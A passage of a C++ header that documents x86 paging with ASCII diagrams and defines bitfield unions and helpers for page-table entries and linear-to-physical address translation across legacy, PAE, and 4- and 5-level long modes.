                      /  |     | 
                     /  ...   ...
                    /            
               PDE.PS == 1       
                                 


Long mode, 4-Level paging, 4Kb pages:
EFER.LMA == 1
CR4.LA57 == 0
PDPE.PS  == 0
PDE.PS   == 0

   Linear address:
   +------------+-----------+----------+----------+----------------+
   | PML4 Index | PDP Index | PD Index | PT Index | Offset in page |
   +-+----------+-----+-----+-------+--+-----+----+---------+------+
     |                |             |        |              |
     |    PML4 Table  |             |        |              +-------+
CR3 -----> +-------+  |             |        |                      |
     |     | PML4E |  |             |        +---+      Page Table  |
     |     +-------+  |  PDP Table  |            |  +--> +-----+    |
     +---> | PML4E | ---> +------+  |            |  |    | PTE |    |
           +-------+  |   | PDPE |  |            |  |    +-----+    +--------------------+
           | PML4E |  |   +------+  |   PD Table |  |    | PTE |                         |
           +-------+  +-> | PDPE | ---> +-----+  |  |    +-----+                         V
           |       |    / +------+  |   | PDE |  +--|--> | PTE | -> (PFN * PageSize) + Offset = Physical Address
          ...     ...  /  |      |  |   +-----+     |    +-----+             [4Kb]
                      /  ...    ... |   | PDE |     |    |     |
                     /              |   +-----+     |   ...   ...
              PDPE.PS == 0          +-> | PDE | ----+
                                      / +-----+
                                     /  |     |
                                    /  ...   ...
                                   /
                             PDE.PS == 0



Long mode, 4-Level paging, large (2Mb) pages:
EFER.LMA == 1
CR4.LA57 == 0
PDPE.PS  == 0
PDE.PS   == 1

   Linear address:
   +------------+-----------+----------+------------------------+
   | PML4 Index | PDP Index | PD Index |     Offset in page     |
   +-+----------+-----+-----+-------+--+---------------------+--+
     |                |             |                        |
     |    PML4 Table  |             |                        |
CR3 -----> +-------+  |             |                        |
     |     | PML4E |  |             |                        |
     |     +-------+  |  PDP Table  |                        |
     +---> | PML4E | ---> +------+  |                        |
           +-------+  |   | PDPE |  |                        +----------+
           | PML4E |  |   +------+  |   PD Table                        |
           +-------+  +-> | PDPE | ---> +-----+                         |
           |       |    / +------+  |   | PDE |                         |
          ...     ...  /  |      |  |   +-----+                         |
                      /  ...    ... |   | PDE |                         |
                     /              |   +-----+                         V
                    /               +-> | PDE | -> (PFN * PageSize) + Offset = Physical Address
              PDPE.PS == 0            / +-----+             [2Mb]
                                     /  |     |
                                    /  ...   ...
                                   /
                             PDE.PS == 1



Long mode, 4-Level paging, huge (1Gb) pages:
EFER.LMA == 1
CR4.LA57 == 0
PDPE.PS  == 1

   Linear address:
   +------------+-----------+-----------------------------------+
   | PML4 Index | PDP Index |           Offset in page          |
   +-+----------+-----+-----+------------------------------+----+
     |                |                                    |
     |    PML4 Table  |                                    |
CR3 -----> +-------+  |                                    |
     |     | PML4E |  |                                    |
     |     +-------+  |  PDP Table                         |
     +---> | PML4E | ---> +------+                         |
           +-------+  |   | PDPE |                         |
           | PML4E |  |   +------+                         V
           +-------+  +-> | PDPE | -> (PFN * PageSize) + Offset = Physical Address
           |       |    / +------+            [1Gb]
          ...     ...  /  |      |
                      /  ...    ...
                     /
               PDPE.PS == 1



Long mode, 5-Level paging:
EFER.LMA == 1
CR4.LA57 == 1
PDPE.PS  == The same variants as in 4-Level paging
PDE.PS   == The same variants as in 4-Level paging

   Linear address:
   +------------+------------+-----------+----------+----------+----------------+
   | PML5 Index | PML4 Index | PDP Index | PD Index | PT Index | Offset in page |
   +------------+-----+------+--------+--+--------+-+--------+-+-----------+----+
     |                |               |           |          |             |
     |    PML5 Table  |              ...         ...        ...           ...
CR3 -----> +-------+  |
     |     | PML5E |  |
     |     +-------+  |  PML4 Table
     +---> | PML5E | ---> +-------+
           +-------+  |   | PML4E |
           | PML5E |  |   +-------+
           +-------+  +-> | PML4E | -> ...The same variants as in 4-Level paging...
           |       |      +-------+
          ...     ...     |       |
                         ...     ...



*/



#pragma pack(push, 1)

namespace Pte
{



//
// 5-Level paging is available starting with Intel Ice Lake (10th Gen) and AMD EPYC 7xxx "Genoa" (Zen 4).
//
enum class Mode
{
    legacyNonPae,   // i386 (EFER.LMA == 0, CR4.PAE == 0, CR4.PSE is meaningful)
    legacyPae,      // i386 with Physical Address Extension (EFER.LMA == 0, CR4.PAE == 1, CR4.PSE is ignored)
    longMode4Level, // amd64 with 4-Level paging (EFER.LMA == 1, CR4.PAE is always 1, CR4.LA57 = 0, CR4.PSE is ignored)
    longMode5Level, // amd64 with 5-Level paging (EFER.LMA == 1, CR4.PAE is always 1, CR4.LA57 = 1, CR4.PSE is ignored)
};

enum class PageSize
{
    generic,
    nonPse,
    pse
};



struct PhysicalAddress
{
    unsigned long long physicalAddress{};
};

template <typename Type>
struct PhysicalLayout : public PhysicalAddress
{
    using Layout = Type;
};



template <Mode mode>
union LinearAddress;

template <>
union LinearAddress<Mode::legacyNonPae> // CR4.PAE == 0
{
    unsigned int raw{};

    struct
    {
        unsigned int : 22; // Depends on page size
        unsigned int PageDirectoryOffset : 10;
    } generic;

    union
    {
        struct
        {
            unsigned int PageOffset : 12; // Offset into the physical page
            unsigned int PageTableOffset : 10; // Index into the 1024-entry page-table
            unsigned int PageDirectoryOffset : 10; // Index into the 1024-entry Page-Directory Table
        } page4Kb;
    } pdeNonPageSize; // PDE.PS == 0

    union
    {
        struct
        {
            unsigned int PageOffset : 22; // Offset into the physical page
            unsigned int PageDirectoryOffset : 10; // Index into the 1024-entry Page-Directory Table
        } page4Mb;
    } pdePageSize; // PDE.PS == 1
};
static_assert(sizeof(LinearAddress<Mode::legacyNonPae>) == sizeof(unsigned int));

template <>
union LinearAddress<Mode::legacyPae> // CR4.PAE == 1
{
    unsigned int raw{};

    struct
    {
        unsigned int : 21; // Depends on page size
        unsigned int PageDirectoryOffset : 9;
        unsigned int PageDirectoryPointerOffset : 2;
    } generic;

    union
    {
        struct
        {
            unsigned int PageOffset : 12; // Byte offset into the physical page
            unsigned int PageTableOffset : 9; // Index into the 512-entry Page Table
            unsigned int PageDirectoryOffset : 9; // Index into the 512-entry Page-Directory Table
            unsigned int PageDirectoryPointerOffset : 2; // Index into a 4-entry Page-Directory Pointer table
        } page4Kb;
    } pdeNonPageSize; // PDE.PS == 0

    union
    {
        struct
        {
            unsigned int PageOffset : 21; // Byte offset into the physical page
            unsigned int PageDirectoryOffset : 9; // Index into the 512-entry Page-Directory Table
            unsigned int PageDirectoryPointerOffset : 2; // Index into a 4-entry Page-Directory Pointer table
        } page2Mb;
    } pdePageSize; // PDE.PS == 1
};
static_assert(sizeof(LinearAddress<Mode::legacyPae>) == sizeof(unsigned int));

template <>
union LinearAddress<Mode::longMode4Level>
{
    unsigned long long raw{};

    struct
    {
        unsigned long long : 30; // Depends on page size
        unsigned long long PageDirectoryPointerOffset : 9;
        unsigned long long PageMapLevel4Offset : 9;
        unsigned long long SignExtend : 16;
    } generic;

    union
    {
        struct
        {
            unsigned long long : 21; // Depends on page size
            unsigned long long PageDirectoryOffset : 9;
            unsigned long long PageDirectoryPointerOffset : 9;
            unsigned long long PageMapLevel4Offset : 9;
            unsigned long long SignExtend : 16;
        } generic; // To determine whether the page size is 4Kb or 2Mb

        union
        {
            struct
            {
                unsigned long long PageOffset : 12; // Byte offset into the physical page
                unsigned long long PageTableOffset : 9; // Index into the 512-entry Page Table
                unsigned long long PageDirectoryOffset : 9; // Index into the 512-entry Page-Directory Table
                unsigned long long PageDirectoryPointerOffset : 9; // Index into the 512-entry Page-Directory Pointer table
                unsigned long long PageMapLevel4Offset : 9; // Index into the 512-entry Page-Map Level-4 table
                unsigned long long SignExtend : 16;
            } page4Kb;
        } pdeNonPageSize; // PDE.PS == 0

        union
        {
            struct
            {
                unsigned long long PageOffset : 21; // Byte offset into the physical page
                unsigned long long PageDirectoryOffset : 9; // Index into the 512-entry Page-Directory Table
                unsigned long long PageDirectoryPointerOffset : 9; // Index into the 512-entry Page-Directory Pointer table
                unsigned long long PageMapLevel4Offset : 9; // Index into the 512-entry Page-Map Level-4 table
                unsigned long long SignExtend : 16;
            } page2Mb;
        } pdePageSize; // PDE.PS == 1
    } pdpeNonPageSize; // PDPE.PS == 0

    union
    {
        struct
        {
            unsigned long long PageOffset : 30; // Byte offset into the physical page
            unsigned long long PageDirectoryPointerOffset : 9; // Index into the 512-entry Page-Directory Pointer table
            unsigned long long PageMapLevel4Offset : 9; // Index into the 512-entry Page-Map Level-4 table
            unsigned long long SignExtend : 16;
        } page1Gb;
    } pdpePageSize; // PDPE.PS == 1
};
static_assert(sizeof(LinearAddress<Mode::longMode4Level>) == sizeof(unsigned long long));

template <>
union LinearAddress<Mode::longMode5Level>
{
    unsigned long long raw{};

    struct
    {
        unsigned long long : 30; // Depends on page size
        unsigned long long PageDirectoryPointerOffset : 9; // Index into the 512-entry Page-Directory Pointer table
        unsigned long long PageMapLevel4Offset : 9; // Index into the 512-entry Page-Map Level-4 table
        unsigned long long PageMapLevel5Offset : 9; // Index into the 512-entry Page-Map Level-5 table
        unsigned long long SignExtend : 7;
    } generic;

    union
    {
        struct
        {
            unsigned long long : 21; // Depends on page size
            unsigned long long PageDirectoryOffset : 9;
            unsigned long long PageDirectoryPointerOffset : 9;
            unsigned long long PageMapLevel4Offset : 9;
            unsigned long long PageMapLevel5Offset : 9;
            unsigned long long SignExtend : 7;
        } generic; // To determine whether the page size is 4Kb or 2Mb

        union
        {
            struct
            {
                unsigned long long PageOffset : 12; // Byte offset into the physical page
                unsigned long long PageTableOffset : 9; // Index into the 512-entry Page Table
                unsigned long long PageDirectoryOffset : 9; // Index into the 512-entry Page-Directory Table
                unsigned long long PageDirectoryPointerOffset : 9; // Index into the 512-entry Page-Directory Pointer table
                unsigned long long PageMapLevel4Offset : 9; // Index into the 512-entry Page-Map Level-4 table
                unsigned long long PageMapLevel5Offset : 9; // Index into the 512-entry Page-Map Level-5 table
                unsigned long long SignExtend : 7;
            } page4Kb;
        } pdeNonPageSize; // PDE.PS == 0

        union
        {
            struct
            {
                unsigned long long PageOffset : 21; // Byte offset into the physical page
                unsigned long long PageDirectoryOffset : 9; // Index into the 512-entry Page-Directory Table
                unsigned long long PageDirectoryPointerOffset : 9; // Index into the 512-entry Page-Directory Pointer table
                unsigned long long PageMapLevel4Offset : 9; // Index into the 512-entry Page-Map Level-4 table
                unsigned long long PageMapLevel5Offset : 9; // Index into the 512-entry Page-Map Level-5 table
                unsigned long long SignExtend : 7;
            } page2Mb;
        } pdePageSize; // PDE.PS == 1
    } pdpeNonPageSize; // PDPE.PS == 0

    union
    {
        struct
        {
            unsigned long long PageOffset : 30; // Byte offset into the physical page
            unsigned long long PageDirectoryPointerOffset : 9; // Index into the 512-entry Page-Directory Pointer table
            unsigned long long PageMapLevel4Offset : 9; // Index into the 512-entry Page-Map Level-4 table
            unsigned long long PageMapLevel5Offset : 9; // Index into the 512-entry Page-Map Level-5 table
            unsigned long long SignExtend : 7;
        } page1Gb;
    } pdpePageSize; // PDPE.PS == 1
};
static_assert(sizeof(LinearAddress<Mode::longMode5Level>) == sizeof(unsigned long long));



// Page frame number:
template <Mode mode>
struct Pfn;

template <>
struct Pfn<Mode::legacyNonPae>
{
    static constexpr unsigned int toPage(const unsigned int pfn) noexcept
    {
        return pfn << 12u; // 1 << 12 == 4096 (0x1000, 4Kb)
    }

    static constexpr unsigned int toLarge(const unsigned int pfn) noexcept
    {
        return pfn << 22u; // 1 << 22 == 4'194'304 (0x400'000, 4Mb)
    }
};

template <>
struct Pfn<Mode::legacyPae>
{
    static constexpr unsigned int toPage(const unsigned int pfn) noexcept
    {
        return pfn << 12u; // 1 << 12 == 4096 (0x1000, 4Kb)
    }

    static constexpr unsigned int toLarge(const unsigned int pfn) noexcept
    {
        return pfn << 21u; // 1 << 21 == 2'097'152 (0x200'000, 2Mb)
    }
};

template <>
struct Pfn<Mode::longMode4Level>
{
    static constexpr unsigned long long toPage(const unsigned long long pfn) noexcept
    {
        return pfn << 12ull; // 1 << 12 == 4096 (0x1000, 4Kb)
    }

    static constexpr unsigned long long toLarge(const unsigned long long pfn) noexcept
    {
        return pfn << 21ull; // 1 << 21 == 2'097'152 (0x20'0000, 2Mb)
    }

    static constexpr unsigned long long toHuge(const unsigned long long pfn) noexcept
    {
        return pfn << 30ull; // 1 << 30 == 1'073'741'824 (0x4000'0000, 1Gb)
    }
};

template <>
struct Pfn<Mode::longMode5Level>
{
    static constexpr unsigned long long toPage(const unsigned long long pfn) noexcept
    {
        return pfn << 12ull; // 1 << 12 == 4096 (0x1000, 4Kb)
    }

    static constexpr unsigned long long toLarge(const unsigned long long pfn) noexcept
    {
        return pfn << 21ull; // 1 << 21 == 2'097'152 (0x20'0000, 2Mb)
    }

    static constexpr unsigned long long toHuge(const unsigned long long pfn) noexcept
    {
        return pfn << 30ull; // 1 << 30 == 1'073'741'824 (0x4000'0000, 1Gb)
    }
};



template <Mode mode>
struct Tables;

template <>
struct Tables<Mode::legacyNonPae>
{
    static constexpr Mode k_mode = Mode::legacyNonPae;
    static constexpr auto k_entrySize = sizeof(unsigned int);
    using LinearAddress = LinearAddress<k_mode>;
    using Pfn = Pfn<k_mode>;

    template <PageSize pageSize>
    union Pde;

    //
    // Describes 4Mb in 1024x4Kb pages: PDE(PS=0) -> PTE -> PA (4Kb)
    //
    template <>
    union Pde<PageSize::nonPse>
    {
        //
        // Describes 4Kb page: PDE -> PTE -> PA (4Kb)
        //
        union Pte
        {
            unsigned int raw;
            struct
            {
                unsigned int P : 1; // Present
                unsigned int RW : 1; // Read/Write
                unsigned int US : 1; // User/Supervisor
                unsigned int PWT : 1; // Page-Level Writethrough
                unsigned int PCD : 1; // Page-Level Cache Disable
                unsigned int A : 1; // Accessed
                unsigned int D : 1; // Dirty
                unsigned int PAT : 1; // Page-Attribute Table
                unsigned int G : 1; // Global Page
                unsigned int AVL : 3; // Available to software
                unsigned int PhysicalPageFrameNumber : 20;
            } page4Kb;

            constexpr PhysicalAddress physicalPageBase() const noexcept
            {
                return PhysicalAddress{ Pfn::toPage(this->page4Kb.PhysicalPageFrameNumber) };
            }

            constexpr PhysicalAddress physicalAddress(const LinearAddress& linear) const noexcept
            {
                return PhysicalAddress{ this->physicalPageBase().physicalAddress + linear.pdeNonPageSize.page4Kb.PageOffset };
            }
        };

        //
        // Describes 4Mb of linear address space.
        //
        using Pt = Pte[1024];

        unsigned int raw{};
        struct
        {
            unsigned int P : 1; // Present
            unsigned int RW : 1; // Read/Write
            unsigned int US : 1; // User/Supervisor
            unsigned int PWT : 1; // Page-Level Writethrough
            unsigned int PCD : 1; // Page-Level Cache Disable
            unsigned int A : 1; // Accessed
            unsigned int Ignored0 : 1;
            unsigned int PS : 1; // PageSize == 0
            unsigned int Ignored1 : 1;
            unsigned int AVL : 3; // Available to software
            unsigned int PT : 20; // Page frame number
        } layout;

        constexpr PhysicalLayout<Pt> pt() const noexcept
        {
            return PhysicalLayout<Pt>{ Pfn::toPage(this->layout.PT) };
        }

        constexpr PhysicalLayout<Pte> pte(const LinearAddress& linear) const noexcept
        {
            return PhysicalLayout<Pte>{ this->pt().physicalAddress + linear.pdeNonPageSize.page4Kb.PageTableOffset * k_entrySize };
        }
    };
    static_assert(sizeof(Pde<PageSize::nonPse>) == sizeof(unsigned int));

    //
    // Describes 4Mb page itself: PDE(PS=1) -> PA (4Mb)
    //
    template <>
    union Pde<PageSize::pse>
    {
        unsigned int raw;
        struct
        {
            unsigned int P : 1; // Present
            unsigned int RW : 1; // Read/Write
            unsigned int US : 1; // User/Supervisor
            unsigned int PWT : 1; // Page-Level Writethrough
            unsigned int PCD : 1; // Page-Level Cache Disable
            unsigned int A : 1; // Accessed
            unsigned int D : 1; // Dirty
            unsigned int PS : 1; // PageSize == 1
            unsigned int G : 1; // Global Page
            unsigned int AVL : 3; // Available to software
            unsigned int PAT : 1; // Page-Attribute Table
            unsigned int PhysicalPageFrameNumberHigh : 8;
            unsigned int : 1;
            unsigned int PhysicalPageFrameNumberLow : 10;
        } page4Mb;

        constexpr PhysicalAddress physicalPageBase() const noexcept
        {
            return PhysicalAddress{ Pfn::toLarge((this->page4Mb.PhysicalPageFrameNumberHigh << 10) | this->page4Mb.PhysicalPageFrameNumberLow) };
        }

        constexpr PhysicalAddress physicalAddress(const LinearAddress& linear) const noexcept
        {
            return PhysicalAddress{ this->physicalPageBase().physicalAddress + linear.pdePageSize.page4Mb.PageOffset };
        }
    };
    static_assert(sizeof(Pde<PageSize::pse>) == sizeof(unsigned int));

    //
    // Describes 4 Mb in the following ways:
    //   4Mb page itself  | PDE(PS=1) -> PA (4Mb)
    //   1024x4Kb pages   | PDE(PS=0) -> PTE -> PA (4Kb)
    //
    template <>
    union Pde<PageSize::generic>
    {
        unsigned int raw;
        struct
        {
            unsigned int P : 1; // Present
            unsigned int RW : 1; // Read/Write
            unsigned int US : 1; // User/Supervisor
            unsigned int PWT : 1; // Page-Level Writethrough
            unsigned int PCD : 1; // Page-Level Cache Disable
            unsigned int A : 1; // Accessed
            unsigned int : 1;
            unsigned int PS : 1; // PageSize bit
            unsigned int : 1;
            unsigned int AVL : 3; // Available to software
            unsigned int : 20;
        } layout;

        Pde<PageSize::nonPse> nonPse;
        Pde<PageSize::pse> pse;

        constexpr PageSize pageSize() const noexcept
        {
            return this->layout.PS
                ? PageSize::pse
                : PageSize::nonPse;
        }
    };
    static_assert(sizeof(Pde<PageSize::generic>) == sizeof(unsigned int));

    using PdeGeneric = Pde<PageSize::generic>;
    using PdeNonPse = Pde<PageSize::nonPse>;
    using PdePse = Pde<PageSize::pse>;

    //
    // Describes 4 Gb of linear address space.
    //
    using Pd = PdeGeneric[1024];

    static constexpr PhysicalLayout<Pd> pd(const unsigned int cr3Pfn) noexcept
    {
        return PhysicalLayout<Pd>{ Pfn::toPage(cr3Pfn) };
    }

    static constexpr PhysicalLayout<PdeGeneric> pde(const unsigned int cr3Pfn, const LinearAddress& linear) noexcept
    {
        return PhysicalLayout<PdeGeneric>{ pd(cr3Pfn).physicalAddress + linear.generic.PageDirectoryOffset * k_entrySize };
    }
};

template <>
struct Tables<Mode::legacyPae> // EFER.LMA == 0, CR4.PAE == 1, CR4.PSE is ignored
{
    static constexpr Mode k_mode = Mode::legacyPae;
    static constexpr auto k_entrySize = sizeof(unsigned long long);
    using LinearAddress = LinearAddress<k_mode>;
    using Pfn = Pfn<k_mode>;

    //
    // Describes 1 Gb in one of the following ways:
    //   512x2Mb pages        | PDPE -> PDE(PS=1) -> PA (2Mb)
    //   512x[512x4Kb] pages  | PDPE -> PDE(PS=0) -> PA (4Kb)
    //
    union Pdpe
    {
        unsigned long long raw;
        struct
        {
            unsigned long long P : 1; // Present
            unsigned long long : 2;
            unsigned long long PWT : 1; // Page-Level Writethrough
            unsigned long long PCD : 1; // Page-Level Cache Disable
            unsigned long long : 4;
            unsigned long long AVL : 3; // Available to software
            unsigned long long PD : 40; // Page frame number
            unsigned long long : 12;
        } layout;

        template <PageSize pageSize>
        union Pde;

        //
        // Describes 2 Mb in 512x4Kb pages: PDPE -> PDE(PS=0) -> PTE -> PA (2Mb)
        //
        template <>
        union Pde<PageSize::nonPse>
        {
            unsigned long long raw;
            struct
            {
                unsigned long long P : 1; // Present
                unsigned long long RW : 1; // Read/Write
                unsigned long long US : 1; // User/Supervisor
                unsigned long long PWT : 1; // Page-Level Writethrough
                unsigned long long PCD : 1; // Page-Level Cache Disable
                unsigned long long A : 1; // Accessed
                unsigned long long Ignored0 : 1;
                unsigned long long PS : 1; // PageSize == 0
                unsigned long long Ignored1 : 1;
                unsigned long long AVL : 3; // Available to software
                unsigned long long PT : 40; // Page frame number
                unsigned long long Available : 11;
                unsigned long long NX : 1; // No Execute
            } layout;

            //
            // Describes 4Kb page: PDPE -> PDE(PS=0) -> PTE -> PA (4Kb)
            //
            union Pte
            {
                unsigned long long raw;
                struct
                {
                    unsigned long long P : 1; // Present
                    unsigned long long RW : 1; // Read/Write
                    unsigned long long US : 1; // User/Supervisor
                    unsigned long long PWT : 1; // Page-Level Writethrough
                    unsigned long long PCD : 1; // Page-Level Cache Disable
                    unsigned long long A : 1; // Accessed
                    unsigned long long D : 1; // Dirty
                    unsigned long long PAT : 1; // Page-Attribute Table
                    unsigned long long G : 1; // Global Page
                    unsigned long long AVL : 3; // Available to software
                    unsigned long long PhysicalPageFrameNumber : 40;
                    unsigned long long : 11;
                    unsigned long long NX : 1; // No Execute
                } page4Kb;

                constexpr PhysicalAddress physicalPageBase() const noexcept
                {
                    return PhysicalAddress{ Pfn::toPage(this->page4Kb.PhysicalPageFrameNumber) };
                }

                constexpr PhysicalAddress physicalAddress(const LinearAddress& linear) const noexcept
                {
                    return PhysicalAddress{ this->physicalPageBase().physicalAddress + linear.pdeNonPageSize.page4Kb.PageOffset };
                }
            };
            static_assert(sizeof(Pte) == sizeof(unsigned long long));

            //
            // Describes 2 Mb of linear address space.
            //
            using Pt = Pte[512];

            constexpr PhysicalLayout<Pt> pt() const noexcept
            {
                return PhysicalLayout<Pt>{ Pfn::toPage(this->layout.PT) };
            }

            constexpr PhysicalLayout<Pte> pte(const LinearAddress& linear) const noexcept
            {
                return PhysicalLayout<Pte>{ this->pt().physicalAddress + linear.pdeNonPageSize.page4Kb.PageTableOffset * k_entrySize };
            }
        };
        static_assert(sizeof(Pde<PageSize::nonPse>) == sizeof(unsigned long long));

        //
        // Describes 2Mb page: PDPE -> PDE(PS=1) -> PA (2Mb)
        //
        template <>
        union Pde<PageSize::pse>
        {
            unsigned long long raw;
            struct
            {
                unsigned long long P : 1; // Present
                unsigned long long RW : 1; // Read/Write
                unsigned long long US : 1; // User/Supervisor
                unsigned long long PWT : 1; // Page-Level Writethrough
                unsigned long long PCD : 1; // Page-Level Cache Disable
                unsigned long long A : 1; // Accessed
                unsigned long long D : 1; // Dirty
                unsigned long long PS : 1; // PageSize == 1
                unsigned long long G : 1; // Global Page
                unsigned long long AVL : 3; // Available to software
                unsigned long long PAT : 1; // Page-Attribute Table
                unsigned long long : 8;
                unsigned long long PhysicalPageFrameNumber : 31;
                unsigned long long Available : 11;
                unsigned long long NX : 1; // No Execute
            } page2Mb;

            constexpr PhysicalAddress physicalPageBase() const noexcept
            {
                return PhysicalAddress{ Pfn::toLarge(this->page2Mb.PhysicalPageFrameNumber) };
            }

            constexpr PhysicalAddress physicalAddress(const LinearAddress& linear) const noexcept
            {
                return PhysicalAddress{ this->physicalPageBase().physicalAddress + linear.pdePageSize.page2Mb.PageOffset };
            }
        };
        static_assert(sizeof(Pde<PageSize::pse>) == sizeof(unsigned long long));

        //
        // Describes 2Mb in one of the following ways:
        //   2Mb page itself  | PDPE -> PDE(PS=1) -> PA (2Mb)
        //   512x4Kb pages    | PDPE -> PDE(PS=0) -> PA (4Kb)
        //
        template <>
        union Pde<PageSize::generic>
        {
            unsigned long long raw;
            struct
            {
                unsigned long long P : 1; // Present
                unsigned long long RW : 1; // Read/Write
                unsigned long long US : 1; // User/Supervisor
                unsigned long long PWT : 1; // Page-Level Writethrough
                unsigned long long PCD : 1; // Page-Level Cache Disable
                unsigned long long A : 1; // Accessed
                unsigned long long : 1;
                unsigned long long PS : 1; // PageSize
                unsigned long long : 1;
                unsigned long long AVL : 3; // Available to software
                unsigned long long : 51;
                unsigned long long NX : 1; // No Execute
            } layout;

            Pde<PageSize::nonPse> nonPse;
            Pde<PageSize::pse> pse;

            constexpr PageSize pageSize() const noexcept
            {
                return this->layout.PS
                    ? PageSize::pse
                    : PageSize::nonPse;
            }
        };
        static_assert(sizeof(Pde<PageSize::generic>) == sizeof(unsigned long long));

        using PdeGeneric = Pde<PageSize::generic>;
        using PdeNonPse = Pde<PageSize::nonPse>;
        using PdePse = Pde<PageSize::pse>;

        //
        // Describes 1 Gb of linear address space.
        //
        using Pd = PdeGeneric[512];

        constexpr PhysicalLayout<Pd> pd() const noexcept
        {
            return PhysicalLayout<Pd>{ Pfn::toPage(this->layout.PD) };
        }

        constexpr PhysicalLayout<PdeGeneric> pde(const LinearAddress& linear) const noexcept
        {
            return PhysicalLayout<PdeGeneric>{ this->pd().physicalAddress + linear.generic.PageDirectoryOffset * k_entrySize };
        }
    };
    static_assert(sizeof(Pdpe) == sizeof(unsigned long long));

    //
    // Describes 4Gb of linear address space.
    //
    using Pdp = Pdpe[4];

    static constexpr PhysicalLayout<Pdp> pdp(const unsigned int cr3Pfn) noexcept
    {
        return PhysicalLayout<Pdp>{ Pfn::toPage(cr3Pfn) };
    }

    static constexpr PhysicalLayout<Pdpe> pdpe(const unsigned int cr3Pfn, const LinearAddress& linear) noexcept
    {
        return PhysicalLayout<Pdpe>{ pdp(cr3Pfn).physicalAddress + linear.generic.PageDirectoryPointerOffset * k_entrySize };
    }
};

template <>
struct Tables<Mode::longMode4Level> // EFER.LMA == 1, CR4.PAE is always 1, CR4.PSE is ignored, CR4.LA57 == 0
{
    static constexpr Mode k_mode = Mode::longMode4Level;
    static constexpr auto k_entrySize = sizeof(unsigned long long);
    using LinearAddress = LinearAddress<k_mode>;
    using Pfn = Pfn<k_mode>;

    //
    // Describes 512 Gb in one of the following ways:
    //   512x1Gb page               | PML4E -> PDPE(PS=1) -> PA (1Gb)
    //   512x[512x2Mb] pages        | PML4E -> PDPE(PS=0) -> PDE(PS=1) -> PA (2Mb)
    //   512x[512x[512x4Kb]] pages  | PML4E -> PDPE(PS=0) -> PDE(PS=0) -> PTE -> PA (4Kb)
    //
    union Pml4e
    {
        unsigned long long raw;
        struct
        {
            unsigned long long P : 1; // Present
            unsigned long long RW : 1; // Read/Write
            unsigned long long US : 1; // User/Supervisor
            unsigned long long PWT : 1; // Page-Level Writethrough
            unsigned long long PCD : 1; // Page-Level Cache Disable
            unsigned long long A : 1; // Accessed
            unsigned long long Ignored0 : 1;
            unsigned long long : 2;
            unsigned long long AVL : 3; // Available to software
            unsigned long long PDP : 40; // Page frame number of Page Directory Pointer table
            unsigned long long Available : 11;
            unsigned long long NX : 1; // No Execute
        } layout;

        template <PageSize pageSize>
        union Pdpe;

        //
        // Describes 1 Gb in one of the following ways:
        //   512x2Mb pages        | PML4E -> PDPE(PS=0) -> PDE(PS=1) -> PA (2Mb)
        //   512x[512x4Kb] pages  | PML4E -> PDPE(PS=0) -> PDE(PS=0) -> PTE -> PA (4Kb)
        //
        template <>
        union Pdpe<PageSize::nonPse>
        {
            unsigned long long raw;
            struct
            {
                unsigned long long P : 1; // Present
                unsigned long long RW : 1; // Read/Write
                unsigned long long US : 1; // User/Supervisor
                unsigned long long PWT : 1; // Page-Level Writethrough
                unsigned long long PCD : 1; // Page-Level Cache Disable
                unsigned long long A : 1; // Accessed
                unsigned long long Ignored0 : 1;
                unsigned long long PS : 1; // PageSize == 0
                unsigned long long : 1;
                unsigned long long AVL : 3; // Available to software
                unsigned long long PD : 40; // Page frame number of Page Directory table
                unsigned long long Available : 11;
                unsigned long long NX : 1; // No Execute
            } layout;

            template <PageSize pageSize>
            union Pde;

            //
            // Describes 2 Mb in 512x4Kb pages: PML4E -> PDPE(PS=0) -> PDE(PS=0) -> PTE -> PA (2Mb)
            //
            template <>
            union Pde<PageSize::nonPse>
            {
                unsigned long long raw;
                struct
                {
                    unsigned long long P : 1; // Present
                    unsigned long long RW : 1; // Read/Write
                    unsigned long long US : 1; // User/Supervisor
                    unsigned long long PWT : 1; // Page-Level Writethrough
                    unsigned long long PCD : 1; // Page-Level Cache Disable
                    unsigned long long A : 1; // Accessed
                    unsigned long long Ignored0 : 1;
                    unsigned long long PS : 1; // PageSize == 0
                    unsigned long long Ignored1 : 1;
                    unsigned long long AVL : 3; // Available to software
                    unsigned long long PT : 40; // Page frame number of Page Table
                    unsigned long long Available : 11;
                    unsigned long long NX : 1; // No Execute
                } layout;

                //
                // Describes 4Kb page: PML4E -> PDPE(PS=0) -> PDE(PS=0) -> PTE -> PA (4Kb)
                //
                union Pte
                {
                    unsigned long long raw;
                    struct
                    {
                        unsigned long long P : 1; // Present
                        unsigned long long RW : 1; // Read/Write
                        unsigned long long US : 1; // User/Supervisor
                        unsigned long long PWT : 1; // Page-Level Writethrough
                        unsigned long long PCD : 1; // Page-Level Cache Disable
                        unsigned long long A : 1; // Accessed
                        unsigned long long D : 1; // Dirty
                        unsigned long long PAT : 1; // Page-Attribute Table
                        unsigned long long G : 1; // Global Page
                        unsigned long long AVL : 3; // Available to software
                        unsigned long long PhysicalPageFrameNumber : 40;
                        unsigned long long Available : 11;
                        unsigned long long NX : 1; // No Execute
                    } page4Kb;

                    constexpr PhysicalAddress physicalPageBase() const noexcept
                    {
                        return PhysicalAddress{ Pfn::toPage(this->page4Kb.PhysicalPageFrameNumber) };
                    }

                    constexpr PhysicalAddress physicalAddress(const LinearAddress& linear) const noexcept
                    {
                        return PhysicalAddress{ this->physicalPageBase().physicalAddress + linear.pdpeNonPageSize.pdeNonPageSize.page4Kb.PageOffset };
                    }
                };
                static_assert(sizeof(Pte) == sizeof(unsigned long long));

                //
                // Describes 2 Mb of linear address space.
                //
                using Pt = Pte[512];

                constexpr PhysicalLayout<Pt> pt() const noexcept
                {
                    return PhysicalLayout<Pt>{ Pfn::toPage(this->layout.PT) };
                }

                constexpr PhysicalLayout<Pte> pte(const LinearAddress& linear) const noexcept
                {
                    return PhysicalLayout<Pte>{ this->pt().physicalAddress + linear.pdpeNonPageSize.pdeNonPageSize.page4Kb.PageTableOffset * k_entrySize };
                }
            };
            static_assert(sizeof(Pde<PageSize::nonPse>) == sizeof(unsigned long long));

            //
            // Describes 2Mb page: PML4E -> PDPE(PS=0) -> PDE(PS=1) -> PA (2Mb)
            //
            template <>
            union Pde<PageSize::pse>
            {
                unsigned long long raw;
                struct
                {
                    unsigned long long P : 1; // Present
                    unsigned long long RW : 1; // Read/Write
                    unsigned long long US : 1; // User/Supervisor
                    unsigned long long PWT : 1; // Page-Level Writethrough
                    unsigned long long PCD : 1; // Page-Level Cache Disable
                    unsigned long long A : 1; // Accessed
